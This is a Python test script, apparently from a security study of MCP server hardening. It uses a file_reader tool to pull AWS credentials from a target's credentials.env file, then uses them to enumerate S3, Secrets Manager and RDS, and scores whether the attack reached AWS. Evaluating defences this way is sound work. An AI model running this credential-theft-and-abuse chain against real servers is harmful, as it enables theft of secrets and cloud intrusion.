#!/usr/bin/env python3
"""
Purpose: Scenario C — AWS API abuse using credentials extracted via file_reader.
         Extracts mock AWS credentials from credentials.env, constructs a boto3
         session, and attempts S3, Secrets Manager, and RDS API calls.
         Outcome classification:
           ATTEMPTED — reached the AWS API endpoint; got an auth error (not network blocked)
           BLOCKED   — network-layer block; EndpointResolutionError or connection error
           SUCCESS   — call returned data (not expected with mock creds; logged if it occurs)
           ERROR     — unexpected exception type
         Baseline:  ATTEMPTED (mock creds reach AWS, receive InvalidClientTokenId).
         Hardened:  FAILED/BLOCKED (file_reader rejected + SG blocks outbound).
         Note on mock credentials: AKIAIOSFODNN7EXAMPLE conforms to the AWS access
         key format (AKIA prefix, 20 chars, uppercase alphanumeric), so boto3 sends
         the request to AWS before failing on auth — classifying as ATTEMPTED.
         A malformed key would fail boto3 client-side validation before any network
         call, which would never count as ATTEMPTED. This distinction matters for M1.
Component: 3 — Attack Scenarios and Timing
Metrics:   M1 (attack success rate), M2 (scope of compromise), M3 (detection)
"""

import argparse
import asyncio
import json
import os
import shlex
import time
from datetime import datetime, timezone

import boto3
import botocore.exceptions
from mcp.client.session import ClientSession
from mcp.client.sse import sse_client

CREDENTIALS_PATH = "/mnt/data/config/credentials.env"

AWS_RESOURCES = [
    ("s3",            "list_buckets",           {},  "S3 bucket enumeration",         "High"),
    ("secretsmanager","list_secrets",            {},  "Secrets Manager enumeration",    "High"),
    ("rds",           "describe_db_instances",   {},  "RDS instance enumeration",       "High"),
]


def _parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(description="Scenario C — AWS API abuse via extracted credentials")
    parser.add_argument("--target-ip",    required=True)
    parser.add_argument("--port",         type=int, default=8080)
    parser.add_argument("--architecture", choices=["baseline", "hardened"], default="baseline")
    parser.add_argument("--aws-region",   default="eu-west-1")
    return parser.parse_args()


async def _read_credentials_file(sse_url: str) -> tuple[str | None, str | None]:
    """Read credentials.env via file_reader. Returns (content, error)."""
    try:
        async with asyncio.timeout(35):
            async with sse_client(sse_url) as (read, write):
                async with ClientSession(read, write) as session:
                    await session.initialize()
                    result = await session.call_tool(
                        "file_reader", {"path": CREDENTIALS_PATH}
                    )
                    if result.isError:
                        err = result.content[0].text if result.content else "tool error"
                        return None, err
                    text = "\n".join(b.text for b in result.content if hasattr(b, "text"))
                    return text, None
    except asyncio.TimeoutError:
        return None, "timeout"
    except Exception as exc:  # noqa: BLE001
        return None, f"{type(exc).__name__}: {exc}"


def _parse_credentials(env_text: str) -> dict[str, str]:
    """
    Parse KEY=VALUE pairs from credentials.env content using shlex.split()
    rather than eval() or manual string splitting.
    Returns dict of {KEY: VALUE}.
    """
    creds: dict[str, str] = {}
    for token in shlex.split(env_text, posix=True):
        if "=" in token:
            key, _, value = token.partition("=")
            creds[key.strip()] = value.strip()
    return creds


def _classify_aws_call(service: str, operation: str, session: boto3.Session, region: str) -> dict:
    """
    Attempt an AWS API call and classify the outcome.
    Returns a dict with keys: outcome, error_code, detail.
    """
    try:
        client = session.client(service, region_name=region)
        method = getattr(client, operation)
        response = method()
        # If we reach here, the call returned data — SUCCESS
        # (should not happen with mock credentials)
        return {
            "outcome":    "SUCCESS",
            "error_code": None,
            "detail":     f"Unexpected SUCCESS — response keys: {list(response.keys())}",
        }
    except botocore.exceptions.ClientError as exc:
        code = exc.response["Error"]["Code"]
        # Auth errors mean the request REACHED the AWS endpoint
        if code in (
            "InvalidClientTokenId",
            "AuthFailure",
            "AccessDenied",
            "UnauthorizedOperation",
            "InvalidSignatureException",
        ):
            return {
                "outcome":    "ATTEMPTED",
                "error_code": code,
                "detail":     f"Reached AWS endpoint; auth rejected with {code}",
            }
        return {
            "outcome":    "ERROR",
            "error_code": code,
            "detail":     str(exc),
        }
    except botocore.exceptions.NoRegionError as exc:
        return {"outcome": "ERROR", "error_code": "NoRegionError", "detail": str(exc)}
    except (
        botocore.exceptions.EndpointResolutionError,
        botocore.exceptions.ConnectTimeoutError,
    ) as exc:
        # Network-layer block — hardened egress controls working
        return {
            "outcome":    "BLOCKED",
            "error_code": type(exc).__name__,
            "detail":     f"Network-layer block: {exc}",
        }
    except Exception as exc:  # noqa: BLE001
        exc_type = type(exc).__name__
        # Connection refused / name resolution failure = network block
        if any(kw in exc_type.lower() for kw in ("connection", "socket", "timeout", "resolve")):
            return {
                "outcome":    "BLOCKED",
                "error_code": exc_type,
                "detail":     f"Network-layer block: {exc}",
            }
        return {"outcome": "ERROR", "error_code": exc_type, "detail": str(exc)}


def main() -> None:
    args = _parse_args()
    sse_url = f"http://{args.target_ip}:{args.port}/sse"
    out_dir = os.path.join("results", args.architecture)
    os.makedirs(out_dir, exist_ok=True)

    timestamp_start = datetime.now(timezone.utc).isoformat()
    runs = []

    for run_num in range(1, 4):
        print(f"\n[Scenario C] Run {run_num}/3 — architecture={args.architecture}")
        run_start = datetime.now(timezone.utc).isoformat()
        outcome = "FAILED"
        m2_items: list[dict] = []
        detail_parts = []

        # ── Step 1: Extract credentials via file_reader ───────────────
        print(f"  Step 1 → file_reader(path={CREDENTIALS_PATH!r})")
        cred_text, cred_err = asyncio.run(_read_credentials_file(sse_url))

        if cred_err:
            outcome = "FAILED"
            detail_parts.append(
                f"Step 1 FAILED: file_reader rejected — {cred_err}. "
                "Cannot proceed to AWS API calls without credentials."
            )
            print(f"    ✗ {cred_err}")
        else:
            # ── Step 2: Parse credentials ──────────────────────────────
            creds = _parse_credentials(cred_text or "")
            key_id  = creds.get("AWS_ACCESS_KEY_ID", "")
            secret  = creds.get("AWS_SECRET_ACCESS_KEY", "")
            print(f"    ✓ Extracted key_id={key_id[:8]}... from credentials.env")
            detail_parts.append(f"Step 1 SUCCESS: credentials parsed (key_id={key_id[:8]}...)")

            if not key_id or not secret:
                outcome = "ERROR"
                detail_parts.append("Step 2 ERROR: AWS_ACCESS_KEY_ID or AWS_SECRET_ACCESS_KEY missing")
            else:
                # ── Step 3: Build boto3 session ────────────────────────
                boto_session = boto3.Session(
                    aws_access_key_id=key_id,
                    aws_secret_access_key=secret,
                    region_name=args.aws_region,
                )

                run_outcomes = []

                # ── Steps 3–5: Attempt S3, SM, RDS ────────────────────
                for svc, op, _, desc, tier in AWS_RESOURCES:
                    print(f"  Step → {svc}.{op}()")
                    call_result = _classify_aws_call(svc, op, boto_session, args.aws_region)
                    call_outcome = call_result["outcome"]
                    run_outcomes.append(call_outcome)
                    m2_items.append({
                        "item":             f"{svc}.{op}",
                        "sensitivity_tier": tier,
                        "aws_outcome":      call_outcome,
                        "error_code":       call_result.get("error_code"),
                    })
                    detail_parts.append(
                        f"{svc}.{op}: {call_outcome} ({call_result.get('error_code', 'n/a')})"
                    )
                    print(
                        f"    {call_outcome:10s} | {call_result.get('error_code', '')} "
                        f"| {call_result['detail'][:70]}"
                    )

                # Classify overall run outcome
                if any(o == "SUCCESS" for o in run_outcomes):
                    outcome = "SUCCESS"
                elif any(o == "ATTEMPTED" for o in run_outcomes):
                    outcome = "ATTEMPTED"
                elif all(o == "BLOCKED" for o in run_outcomes):
                    outcome = "BLOCKED"
                else:
                    outcome = "ERROR"

        run_end = datetime.now(timezone.utc).isoformat()
        runs.append({
            "run_number":        run_num,
            "run_start_time":    run_start,
            "run_end_time":      run_end,
            "outcome":           outcome,
            "m2_items_accessed": m2_items,
            "detail":            " | ".join(detail_parts),
        })
        print(f"  → Run {run_num} outcome: {outcome}")

        if run_num < 3:
            print("  Sleeping 5s before next run...")
            time.sleep(5)

    timestamp_end = datetime.now(timezone.utc).isoformat()

    # M1 scoring:
    # Baseline — ATTEMPTED counts as "reached the attack objective" (API contacted)
    # Hardened — BLOCKED/FAILED means the attack did not reach the API
    success_count = sum(
        1 for r in runs if r["outcome"] in ("SUCCESS", "ATTEMPTED")
    )
    m1_pct = round(success_count / len(runs) * 100, 1)

    result = {
        "scenario":                "C",
        "architecture":            args.architecture,
        "timestamp_start":         timestamp_start,
        "timestamp_end":           timestamp_end,
        "runs":                    runs,
        "m1_success_rate_pct":     m1_pct,
        "m3_log_events_generated": None,
        "_note": (
            "M1 in baseline: ATTEMPTED is the expected outcome with mock credentials. "
            "The mock key AKIAIOSFODNN7EXAMPLE conforms to AWS key format, causing boto3 "
            "to send the request to AWS before receiving InvalidClientTokenId. "
            "For a real attacker with valid credentials, ATTEMPTED would become SUCCESS."
        ),
    }

    out_path = os.path.join(out_dir, "scenario_c_results.json")
    with open(out_path, "w", encoding="utf-8") as fh:
        json.dump(result, fh, indent=2)

    print(f"\n[Scenario C] Complete. M1={m1_pct}% | Results → {out_path}")


if __name__ == "__main__":
    main()
